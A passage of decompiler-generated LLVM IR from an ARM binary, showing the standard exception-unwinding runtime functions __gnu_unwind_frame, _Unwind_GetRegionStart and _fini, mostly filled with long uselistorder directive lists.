248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 4, 264, 261, 262, 263, 265, 266, 267, 268, 269, 287, 283, 284, 285, 286, 288, 289, 290, 291, 292, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355 }
  uselistorder i32* @lr, { 5, 0, 167, 168, 169, 170, 178, 171, 172, 173, 174, 3, 175, 176, 177, 179, 180, 181, 182, 183, 184, 186, 187, 8, 9, 188, 189, 190, 191, 192, 193, 194, 195, 196, 12, 13, 14, 15, 16, 17, 18, 19, 20, 10, 11, 21, 22, 197, 198, 200, 201, 202, 207, 57, 58, 23, 24, 205, 206, 120, 121, 25, 26, 27, 199, 203, 204, 133, 134, 135, 136, 137, 138, 139, 140, 141, 154, 155, 142, 143, 144, 145, 146, 147, 148, 4, 149, 150, 152, 153, 151, 122, 123, 88, 89, 98, 99, 28, 29, 6, 156, 157, 30, 31, 185, 32, 158, 124, 33, 34, 7, 35, 36, 37, 1, 41, 42, 43, 44, 45, 46, 38, 39, 40, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 90, 91, 92, 93, 94, 95, 96, 97, 100, 101, 102, 107, 103, 104, 105, 106, 108, 109, 110, 2, 111, 112, 113, 114, 115, 116, 117, 118, 119, 125, 126, 127, 128, 129, 130, 131, 132, 159, 160, 161, 162, 163, 164, 165, 166 }
  uselistorder i32* @r6, { 365, 366, 367, 378, 368, 18, 369, 2, 370, 371, 3, 372, 373, 374, 375, 376, 377, 379, 0, 380, 381, 52, 53, 50, 51, 54, 382, 383, 4, 384, 385, 386, 387, 37, 38, 55, 5, 56, 57, 58, 59, 60, 16, 61, 62, 63, 6, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 35, 36, 39, 40, 41, 42, 7, 43, 44, 45, 8, 46, 47, 48, 49, 76, 19, 77, 17, 9, 10, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 390, 98, 11, 99, 100, 32, 12, 33, 13, 34, 388, 389, 296, 300, 301, 302, 303, 297, 298, 299, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 340, 341, 342, 316, 317, 318, 319, 320, 14, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 336, 338, 332, 333, 334, 335, 337, 339, 101, 102, 1, 103, 20, 275, 276, 198, 199, 200, 201, 202, 242, 243, 104, 105, 106, 107, 108, 244, 245, 246, 247, 248, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 26, 27, 28, 29, 24, 31, 30, 21, 22, 23, 25, 136, 137, 138, 139, 140, 141, 148, 149, 150, 151, 152, 142, 143, 144, 145, 146, 147, 277, 278, 279, 280, 153, 154, 155, 156, 157, 158, 159, 163, 160, 161, 162, 164, 170, 165, 166, 167, 168, 169, 171, 172, 173, 174, 175, 176, 181, 177, 178, 179, 180, 182, 183, 184, 185, 186, 187, 193, 188, 189, 190, 191, 192, 194, 195, 196, 197, 203, 204, 205, 210, 206, 207, 208, 209, 211, 212, 213, 214, 215, 216, 217, 218, 223, 219, 220, 221, 222, 224, 225, 226, 227, 228, 229, 230, 231, 232, 237, 233, 234, 235, 236, 238, 239, 240, 241, 256, 249, 250, 251, 252, 253, 254, 255, 257, 258, 259, 260, 261, 262, 268, 263, 264, 265, 266, 267, 269, 270, 271, 272, 273, 274, 281, 282, 283, 289, 284, 285, 286, 287, 288, 290, 291, 292, 293, 294, 295, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 15, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364 }
  uselistorder label %dec_label_pc_17fe4, { 1, 0 }
  uselistorder label %dec_label_pc_17f80, { 1, 0 }
  uselistorder label %dec_label_pc_17f2c, { 1, 0 }
  uselistorder label %dec_label_pc_17f04, { 1, 0 }
  uselistorder label %dec_label_pc_17e70, { 1, 0 }
  uselistorder label %dec_label_pc_17e54, { 1, 0 }
  uselistorder label %dec_label_pc_17e38, { 1, 0 }
  uselistorder label %dec_label_pc_17de8, { 1, 0 }
  uselistorder label %dec_label_pc_17dcc, { 1, 0 }
  uselistorder label %dec_label_pc_17d48, { 1, 0 }
  uselistorder label %dec_label_pc_17d2c, { 1, 0 }
  uselistorder label %dec_label_pc_17c68, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_17c38, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_17c20, { 1, 0 }
  uselistorder label %dec_label_pc_17c04, { 1, 0 }
  uselistorder label %dec_label_pc_17968.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_17a90, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_17a84, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17a78, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_17a28, { 1, 0 }
  uselistorder label %dec_label_pc_17a18, { 1, 0 }
  uselistorder label %dec_label_pc_179a4, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_1806c = add i32 %ucbp, 76
  %v2_1806c = inttoptr i32 %v1_1806c to i32*
  %v3_1806c = load i32, i32* %v2_1806c, align 4
  %v1_18070 = add i32 %v3_1806c, 4
  %v2_18070 = inttoptr i32 %v1_18070 to i32*
  %v3_18070 = load i32, i32* %v2_18070, align 4
  %v3_18078 = mul i32 %v3_18070, 256
  %v4_18080 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_18078, i32* %v4_18080, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_180a0 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_180a0

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 268, 259, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 252, 260, 257, 48, 258, 49, 51, 50, 52, 251, 0, 256, 1, 53, 54, 55, 57, 58, 59, 56, 61, 62, 63, 60, 64, 65, 261, 262, 66, 67, 68, 263, 69, 70, 71, 72, 73, 74, 75, 76, 77, 80, 79, 78, 81, 254, 264, 255, 82, 83, 84, 85, 86, 88, 87, 89, 265, 90, 91, 266, 102, 96, 92, 103, 97, 104, 98, 93, 94, 99, 100, 105, 101, 95, 106, 107, 108, 109, 110, 111, 112, 119, 116, 113, 120, 117, 121, 118, 114, 115, 122, 123, 124, 125, 136, 131, 137, 132, 138, 133, 139, 134, 126, 127, 128, 129, 140, 135, 130, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 157, 154, 158, 155, 159, 156, 151, 152, 153, 160, 161, 162, 163, 164, 174, 175, 169, 165, 176, 170, 177, 171, 166, 172, 178, 173, 167, 168, 179, 180, 181, 182, 183, 184, 189, 187, 185, 190, 188, 186, 191, 253, 267, 192, 194, 193, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 212, 219, 213, 220, 214, 215, 208, 209, 221, 216, 222, 217, 210, 211, 218, 223, 224, 225, 226, 227, 228, 233, 240, 234, 241, 235, 229, 230, 242, 236, 243, 237, 238, 231, 232, 239, 244, 245, 246, 247, 248, 249, 250 }
  uselistorder i32 4, { 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 100, 495, 496, 497, 498, 499, 3, 502, 503, 500, 501, 504, 4, 505, 506, 507, 508, 5, 525, 6, 509, 510, 511, 512, 513, 7, 514, 8, 515, 516, 517, 518, 519, 520, 521, 9, 522, 147, 523, 524, 526, 527, 528, 529, 10, 530, 11, 256, 257, 258, 259, 275, 276, 281, 282, 234, 235, 236, 531, 237, 238, 482, 243, 260, 12, 13, 534, 14, 15, 148, 58, 16, 17, 89, 84, 85, 18, 535, 86, 536, 65, 19, 20, 87, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 21, 554, 555, 556, 557, 558, 559, 64, 560, 561, 562, 563, 564, 565, 22, 23, 88, 566, 268, 101, 266, 267, 261, 262, 263, 264, 265, 239, 240, 241, 242, 244, 245, 246, 247, 248, 249, 24, 250, 102, 251, 252, 253, 254, 255, 149, 269, 270, 271, 272, 273, 274, 25, 277, 278, 279, 280, 26, 283, 567, 27, 150, 103, 151, 569, 28, 570, 152, 232, 233, 568, 78, 404, 405, 406, 407, 153, 66, 410, 411, 412, 413, 414, 415, 154, 155, 29, 416, 417, 418, 419, 420, 421, 422, 423, 156, 408, 409, 424, 425, 426, 427, 428, 429, 430, 431, 432, 30, 433, 434, 435, 436, 31, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 157, 158, 159, 451, 452, 455, 458, 453, 454, 104, 160, 456, 59, 457, 459, 460, 461, 463, 161, 33, 32, 462, 162, 163, 164, 284, 34, 35, 67, 532, 533, 203, 36, 37, 68, 226, 105, 227, 38, 286, 287, 39, 288, 73, 74, 72, 289, 204, 205, 228, 229, 106, 210, 211, 212, 206, 207, 208, 209, 213, 214, 215, 216, 217, 218, 107, 219, 220, 221, 108, 222, 109, 223, 224, 225, 230, 231, 61, 60, 290, 79, 291, 40, 292, 63, 62, 293, 41, 285, 294, 295, 300, 110, 301, 111, 302, 112, 303, 113, 304, 114, 305, 115, 306, 116, 307, 117, 308, 118, 309, 119, 310, 120, 311, 121, 312, 122, 313, 123, 314, 124, 315, 125, 316, 126, 318, 127, 319, 128, 320, 321, 317, 296, 129, 297, 298, 299, 322, 77, 76, 75, 323, 130, 42, 43, 44, 45, 46, 47, 324, 70, 69, 325, 71, 131, 326, 327, 328, 132, 329, 330, 165, 331, 332, 333, 334, 335, 166, 167, 133, 336, 48, 134, 337, 90, 338, 339, 168, 340, 341, 169, 170, 342, 135, 343, 91, 344, 345, 171, 172, 346, 173, 347, 348, 349, 174, 175, 350, 136, 351, 92, 352, 176, 177, 353, 354, 355, 137, 93, 356, 357, 178, 358, 359, 360, 179, 180, 0, 138, 361, 94, 362, 363, 364, 181, 365, 366, 182, 183, 1, 80, 367, 139, 368, 95, 369, 370, 371, 372, 184, 185, 373, 374, 186, 375, 376, 140, 377, 2, 378, 96, 379, 141, 380, 381, 382, 187, 383, 384, 385, 386, 188, 189, 143, 387, 81, 388, 142, 389, 97, 390, 391, 392, 190, 393, 394, 395, 144, 396, 145, 397, 398, 399, 191, 192, 146, 400, 82, 401, 98, 402, 99, 403, 193, 49, 464, 194, 50, 465, 195, 51, 466, 196, 83, 52, 467, 468, 197, 53, 469, 198, 54, 470, 199, 55, 471, 200, 56, 472, 201, 57, 473, 474, 202, 475, 476, 477, 478, 479, 480, 481, 483, 484 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 3, 4, 5, 0, 1, 6, 8, 7, 9, 2, 10, 11, 12, 14, 13, 15, 16, 17 }
  uselistorder i32 1, { 646, 1136, 1137, 490, 1141, 1142, 1143, 1144, 522, 1145, 1146, 467, 480, 523, 1138, 1139, 1140, 1147, 491, 1148, 647, 104, 108, 110, 105, 109, 106, 107, 648, 649, 650, 651, 524, 525, 1149, 1150, 457, 654, 653, 652, 147, 149, 148, 150, 152, 151, 657, 656, 655, 133, 526, 527, 290, 1151, 292, 1152, 660, 659, 658, 146, 1153, 1154, 1155, 1156, 662, 661, 128, 130, 131, 129, 132, 288, 289, 461, 663, 342, 894, 664, 343, 344, 345, 665, 93, 895, 896, 897, 275, 274, 276, 277, 666, 153, 667, 297, 294, 295, 293, 296, 668, 304, 303, 300, 301, 302, 298, 299, 669, 26, 27, 34, 35, 30, 31, 32, 33, 28, 29, 346, 670, 494, 867, 161, 162, 160, 95, 94, 1157, 481, 528, 1158, 1, 0, 671, 272, 267, 265, 266, 273, 270, 271, 268, 269, 264, 310, 529, 230, 672, 439, 440, 438, 468, 489, 469, 1130, 1131, 1132, 1133, 482, 673, 441, 675, 674, 442, 443, 873, 676, 898, 899, 900, 1160, 902, 901, 458, 677, 471, 903, 472, 1161, 869, 868, 834, 835, 836, 837, 838, 839, 840, 1162, 36, 37, 38, 39, 1163, 473, 1164, 1165, 1166, 1167, 1168, 1169, 829, 1170, 1171, 1172, 1173, 1174, 1175, 830, 640, 679, 678, 347, 351, 353, 349, 348, 350, 352, 354, 356, 355, 907, 904, 905, 906, 487, 474, 251, 252, 253, 254, 530, 908, 909, 924, 925, 680, 641, 21, 22, 916, 831, 917, 918, 832, 919, 920, 921, 922, 923, 66, 58, 59, 61, 64, 62, 60, 63, 57, 65, 910, 911, 912, 531, 913, 914, 915, 681, 359, 363, 360, 357, 365, 358, 362, 361, 364, 926, 927, 928, 682, 54, 53, 50, 49, 48, 55, 51, 52, 56, 929, 930, 931, 932, 683, 79, 80, 78, 82, 81, 83, 684, 75, 871, 532, 870, 488, 687, 686, 685, 367, 371, 366, 368, 375, 370, 369, 373, 372, 374, 533, 872, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 475, 688, 377, 376, 378, 381, 379, 380, 382, 885, 886, 887, 888, 889, 890, 891, 892, 893, 689, 67, 71, 73, 70, 68, 72, 69, 74, 534, 884, 690, 258, 933, 934, 935, 936, 937, 535, 691, 305, 306, 307, 309, 308, 536, 7, 938, 692, 169, 168, 537, 939, 693, 154, 155, 538, 694, 126, 124, 125, 940, 86, 85, 84, 695, 114, 112, 113, 696, 383, 697, 90, 89, 698, 88, 87, 699, 77, 76, 700, 135, 134, 701, 101, 100, 702, 118, 703, 704, 98, 99, 1176, 1177, 1178, 539, 1179, 1180, 540, 1181, 707, 706, 705, 8, 10, 16, 9, 14, 13, 17, 15, 11, 12, 708, 127, 541, 709, 384, 385, 386, 18, 710, 393, 391, 392, 390, 387, 388, 389, 711, 260, 261, 259, 262, 263, 712, 713, 158, 715, 714, 137, 716, 115, 944, 719, 718, 717, 255, 256, 720, 204, 206, 205, 207, 476, 721, 278, 455, 459, 1071, 722, 46, 43, 44, 45, 47, 42, 1072, 1073, 1074, 723, 395, 394, 402, 401, 396, 403, 398, 399, 397, 404, 400, 279, 462, 864, 865, 866, 724, 725, 1182, 483, 542, 727, 726, 728, 1075, 1078, 1079, 1080, 729, 405, 410, 411, 409, 408, 412, 406, 407, 1081, 1082, 1083, 1084, 730, 417, 423, 416, 422, 421, 415, 425, 424, 419, 413, 418, 414, 420, 1076, 1077, 543, 119, 121, 120, 111, 1085, 544, 1086, 1087, 1088, 1089, 1090, 731, 164, 165, 163, 166, 1091, 117, 116, 1092, 1093, 1094, 1095, 1096, 1097, 495, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 546, 1106, 1107, 1108, 1109, 1110, 545, 1111, 1112, 1113, 1114, 1115, 732, 428, 430, 426, 429, 433, 435, 432, 434, 436, 431, 437, 427, 103, 102, 547, 548, 465, 736, 735, 734, 733, 224, 167, 477, 229, 737, 334, 333, 738, 238, 237, 739, 175, 740, 444, 741, 742, 445, 743, 231, 744, 446, 745, 746, 453, 257, 747, 171, 170, 748, 228, 227, 749, 750, 447, 751, 226, 225, 752, 753, 448, 754, 1058, 1059, 40, 41, 755, 756, 757, 92, 91, 758, 291, 759, 449, 760, 157, 156, 761, 136, 763, 762, 122, 123, 765, 764, 96, 97, 210, 456, 1159, 209, 208, 1000, 478, 1001, 479, 1002, 767, 766, 450, 1126, 1127, 484, 2, 460, 3, 1128, 941, 942, 943, 549, 945, 311, 1116, 159, 947, 946, 948, 24, 23, 25, 1060, 768, 1061, 769, 243, 242, 241, 240, 1062, 770, 186, 185, 184, 183, 550, 859, 551, 860, 497, 861, 485, 562, 862, 949, 496, 950, 846, 486, 563, 564, 847, 842, 553, 841, 843, 844, 845, 556, 554, 466, 848, 555, 849, 850, 557, 851, 852, 560, 853, 854, 558, 855, 856, 559, 857, 858, 561, 863, 951, 952, 953, 565, 954, 955, 956, 566, 957, 833, 960, 959, 552, 958, 961, 962, 567, 963, 964, 965, 568, 966, 569, 967, 570, 968, 571, 969, 572, 970, 573, 971, 574, 972, 575, 973, 576, 974, 577, 975, 578, 976, 579, 977, 580, 978, 581, 979, 582, 980, 583, 981, 584, 982, 585, 983, 586, 984, 991, 992, 463, 587, 642, 781, 780, 779, 778, 777, 776, 775, 643, 774, 773, 772, 771, 340, 337, 335, 339, 336, 338, 341, 985, 986, 588, 987, 988, 589, 989, 990, 328, 327, 326, 332, 329, 330, 331, 325, 324, 590, 591, 783, 782, 451, 452, 1063, 785, 784, 248, 249, 247, 246, 245, 244, 250, 594, 498, 993, 994, 499, 995, 996, 592, 593, 595, 997, 998, 596, 597, 598, 599, 600, 601, 602, 798, 797, 796, 795, 794, 793, 792, 791, 790, 789, 645, 788, 787, 786, 173, 174, 172, 603, 464, 604, 799, 607, 606, 605, 999, 800, 644, 608, 609, 610, 1064, 500, 501, 1065, 4, 5, 6, 1003, 1004, 1005, 470, 492, 493, 1006, 1007, 1008, 1009, 1010, 612, 1011, 611, 1012, 613, 1013, 1014, 1015, 804, 803, 802, 801, 188, 190, 193, 194, 191, 187, 192, 189, 1016, 1017, 1018, 614, 615, 806, 805, 212, 214, 215, 211, 213, 1019, 1020, 616, 1021, 1022, 1023, 1024, 617, 1025, 618, 503, 502, 619, 1026, 807, 284, 285, 287, 286, 282, 283, 1027, 620, 1028, 506, 504, 505, 809, 808, 280, 281, 1029, 1030, 1031, 621, 1032, 622, 623, 1033, 507, 1034, 810, 217, 221, 220, 219, 223, 218, 216, 222, 1035, 1036, 1037, 624, 1038, 625, 509, 508, 626, 1039, 627, 1040, 811, 317, 320, 321, 323, 322, 315, 319, 318, 316, 1041, 1042, 1043, 1044, 1045, 1046, 628, 1047, 629, 1048, 630, 514, 513, 631, 1049, 510, 1050, 511, 1051, 512, 1052, 817, 816, 815, 814, 813, 812, 176, 178, 181, 182, 180, 177, 179, 1053, 1054, 1055, 632, 517, 516, 633, 1056, 515, 1057, 818, 139, 143, 144, 145, 138, 142, 141, 140, 1066, 1067, 1068, 634, 520, 519, 635, 1069, 518, 1070, 823, 822, 821, 820, 819, 196, 203, 200, 202, 201, 195, 199, 198, 197, 1117, 521, 636, 824, 312, 313, 314, 1118, 1119, 637, 1122, 638, 639, 1123, 1120, 1121, 1124, 1125, 235, 233, 236, 232, 234, 1129, 825, 239, 1134, 826, 19, 1135, 20, 827, 828, 454 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_180cc = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_180d4 = add i32 %tmp1, 72
  %v2_180d4 = inttoptr i32 %v1_180d4 to i32*
  %v3_180d4 = load i32, i32* %v2_180d4, align 4
  ret i32 %v3_180d4

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 7, 8, 5, 6, 2, 3, 1, 4, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 8, 7, 10, 9, 165, 166, 167, 168, 14, 15, 68, 16, 71, 58, 59, 169, 60, 4, 11, 170, 171, 172, 173, 174, 176, 177, 175, 178, 179, 180, 181, 182, 183, 184, 17, 18, 19, 20, 22, 21, 23, 61, 62, 24, 25, 63, 64, 65, 66, 67, 69, 70, 26, 72, 73, 74, 185, 5, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 3, 136, 137, 138, 139, 140, 27, 141, 142, 28, 29, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 161, 154, 155, 156, 157, 158, 159, 160, 162, 163, 30, 164, 54, 55, 40, 75, 76, 42, 31, 43, 56, 44, 45, 39, 41, 32, 46, 33, 47, 34, 48, 49, 50, 51, 52, 53, 57, 77, 78, 79, 6, 80, 81, 82, 83, 85, 86, 87, 35, 88, 36, 89, 91, 90, 84, 114, 92, 37, 93, 94, 95, 96, 97, 98, 99, 100, 38, 101, 102, 103, 12, 104, 105, 106, 107, 108, 109, 13, 110, 111, 112, 113, 115, 116, 117, 118, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_180e8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_180e8)
  %v31_180f0 = load i32, i32* @r0, align 4
  ret i32 %v31_180f0

; uselistorder directives
  uselistorder i32* @r0, { 12, 13, 14, 187, 188, 189, 15, 18, 74, 85, 86, 190, 193, 194, 65, 38, 191, 192, 185, 45, 8, 195, 9, 16, 75, 0, 76, 10, 11, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 1, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 77, 17, 66, 67, 68, 69, 70, 71, 72, 73, 78, 79, 80, 81, 82, 83, 84, 19, 20, 87, 88, 89, 90, 21, 92, 22, 93, 23, 24, 25, 26, 222, 223, 225, 57, 58, 55, 56, 27, 139, 140, 2, 28, 29, 94, 95, 3, 30, 31, 226, 227, 4, 32, 33, 157, 158, 5, 34, 35, 63, 64, 224, 91, 165, 36, 51, 52, 166, 6, 167, 168, 169, 170, 53, 171, 172, 173, 54, 174, 175, 37, 183, 176, 177, 178, 179, 180, 181, 182, 96, 97, 47, 159, 39, 160, 145, 40, 146, 149, 41, 150, 98, 48, 99, 151, 42, 152, 100, 43, 101, 102, 103, 44, 104, 46, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 61, 128, 59, 60, 62, 129, 131, 132, 133, 134, 135, 136, 130, 50, 137, 138, 161, 162, 7, 141, 142, 143, 144, 147, 148, 153, 154, 155, 156, 163, 164, 184, 186, 49 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 65, 58, 59, 60, 61, 62, 63, 64, 66, 67, 68, 69, 70, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 30, 31, 32, 71, 76, 77, 78, 79, 80, 81, 82, 72, 86, 87, 88, 89, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 73, 74, 75, 83, 84, 85, 44, 45, 46, 0, 47, 48, 49, 50, 54, 55, 51, 52, 53, 56, 57 }
  uselistorder i32 0, { 334, 333, 371, 372, 1082, 338, 337, 373, 1083, 1084, 1085, 1086, 292, 291, 374, 1087, 1088, 165, 1089, 1091, 1092, 118, 119, 1093, 1094, 1090, 68, 69, 70, 71, 2, 1, 3, 0, 154, 153, 155, 156, 157, 1095, 335, 336, 110, 108, 1096, 1097, 159, 160, 158, 161, 1098, 1099, 1100, 1101, 164, 163, 162, 1102, 1103, 1104, 325, 324, 375, 339, 376, 340, 377, 341, 378, 379, 380, 120, 1105, 355, 354, 1106, 1107, 353, 352, 1108, 381, 350, 351, 348, 349, 347, 346, 1109, 345, 344, 343, 342, 304, 1110, 1126, 1111, 168, 1112, 1113, 1114, 1115, 1116, 1117, 170, 1119, 1120, 166, 167, 1121, 1122, 101, 121, 1123, 1124, 519, 72, 73, 326, 327, 169, 1118, 1125, 303, 1127, 382, 383, 1128, 357, 356, 171, 1129, 1130, 172, 1131, 1132, 1133, 84, 384, 385, 1134, 173, 1135, 122, 1136, 1137, 174, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 32, 102, 386, 1148, 175, 1149, 1150, 1151, 4, 1152, 1153, 5, 1154, 1155, 731, 732, 6, 111, 1156, 387, 1157, 645, 646, 647, 648, 649, 653, 650, 651, 652, 7, 305, 74, 654, 388, 655, 656, 657, 358, 359, 733, 734, 389, 740, 390, 589, 741, 742, 8, 391, 590, 392, 1158, 1159, 1160, 9, 10, 123, 124, 125, 1175, 1176, 11, 591, 126, 127, 1073, 1074, 1075, 1076, 176, 177, 1077, 600, 178, 103, 42, 1177, 75, 306, 1181, 1182, 43, 658, 85, 659, 660, 661, 307, 128, 1178, 1179, 1180, 308, 12, 1183, 1184, 86, 1185, 1186, 1187, 1188, 1189, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1190, 1191, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 33, 1210, 1211, 1212, 1213, 1214, 34, 1215, 1216, 1217, 35, 1218, 1219, 1220, 36, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1245, 1246, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 37, 1264, 1265, 1266, 1267, 1268, 38, 1269, 1270, 1271, 1272, 1273, 39, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 179, 662, 520, 663, 664, 665, 666, 700, 393, 394, 701, 702, 129, 130, 131, 183, 667, 181, 668, 689, 682, 521, 683, 684, 685, 686, 44, 45, 89, 687, 688, 309, 690, 691, 522, 692, 180, 693, 46, 47, 88, 694, 695, 523, 696, 697, 48, 49, 87, 698, 182, 699, 132, 669, 524, 670, 671, 395, 672, 673, 525, 674, 675, 678, 676, 677, 310, 679, 50, 51, 91, 680, 526, 52, 53, 90, 681, 703, 527, 704, 705, 706, 707, 708, 709, 528, 710, 711, 712, 713, 593, 592, 313, 595, 596, 594, 311, 312, 597, 598, 396, 599, 601, 602, 529, 603, 604, 605, 530, 606, 607, 54, 55, 92, 608, 609, 610, 76, 77, 611, 612, 613, 184, 614, 615, 616, 617, 618, 397, 619, 620, 621, 622, 623, 624, 133, 627, 531, 628, 629, 56, 57, 94, 630, 631, 632, 532, 633, 634, 635, 636, 533, 637, 638, 58, 59, 93, 639, 640, 641, 642, 643, 185, 187, 625, 186, 626, 188, 644, 134, 714, 719, 720, 715, 716, 717, 722, 723, 724, 189, 725, 726, 727, 728, 729, 718, 721, 730, 135, 735, 736, 737, 190, 738, 739, 191, 743, 747, 748, 749, 750, 192, 744, 193, 745, 746, 136, 751, 1161, 1162, 1163, 194, 1164, 758, 757, 977, 978, 953, 753, 752, 754, 1289, 1290, 1291, 1292, 195, 1293, 1294, 1295, 979, 980, 322, 323, 398, 1300, 537, 1301, 399, 1302, 1303, 400, 1304, 1305, 535, 196, 315, 1306, 536, 1307, 401, 78, 1308, 1309, 402, 1324, 1325, 1328, 534, 314, 1329, 360, 138, 137, 1326, 1327, 1296, 1297, 538, 197, 293, 580, 13, 14, 1320, 847, 759, 1319, 954, 760, 109, 199, 761, 539, 198, 762, 763, 1310, 1311, 1312, 1313, 403, 1314, 139, 764, 765, 60, 61, 95, 981, 982, 83, 317, 986, 983, 984, 540, 985, 987, 541, 988, 989, 990, 991, 62, 63, 96, 992, 200, 993, 994, 995, 997, 996, 316, 581, 583, 582, 201, 584, 585, 586, 404, 587, 140, 1298, 1299, 141, 406, 407, 1315, 405, 142, 143, 1003, 1004, 1005, 1006, 1007, 202, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 203, 998, 408, 999, 1000, 409, 1001, 1002, 144, 542, 204, 205, 1015, 410, 206, 1016, 1017, 1018, 1019, 1020, 145, 213, 207, 208, 210, 211, 212, 216, 215, 214, 209, 1021, 1022, 1046, 1047, 146, 1023, 1024, 220, 218, 219, 1025, 1026, 226, 225, 151, 217, 1027, 1028, 1029, 1030, 1031, 1032, 329, 328, 361, 411, 1033, 1034, 1035, 79, 1036, 222, 221, 223, 224, 150, 1037, 1038, 318, 1039, 1040, 114, 1041, 1042, 1043, 1044, 1045, 15, 16, 766, 767, 80, 17, 362, 412, 955, 956, 958, 957, 881, 880, 923, 922, 769, 768, 770, 771, 772, 925, 924, 882, 774, 773, 1078, 413, 959, 1316, 1317, 1318, 775, 777, 776, 778, 779, 780, 781, 782, 1321, 1322, 1323, 755, 18, 1165, 1166, 1167, 112, 1168, 1169, 1170, 1171, 1172, 227, 1173, 543, 546, 544, 545, 1174, 547, 228, 64, 229, 414, 783, 1063, 1062, 1064, 1065, 1066, 1067, 40, 230, 1068, 1069, 1070, 231, 104, 105, 369, 370, 756, 233, 232, 234, 784, 235, 785, 786, 236, 1048, 1049, 415, 237, 787, 238, 239, 960, 240, 961, 241, 242, 788, 243, 789, 790, 791, 795, 565, 573, 574, 576, 561, 106, 65, 296, 297, 562, 575, 563, 552, 564, 566, 553, 567, 554, 568, 555, 569, 556, 570, 557, 571, 558, 572, 577, 578, 416, 579, 113, 792, 548, 793, 417, 794, 320, 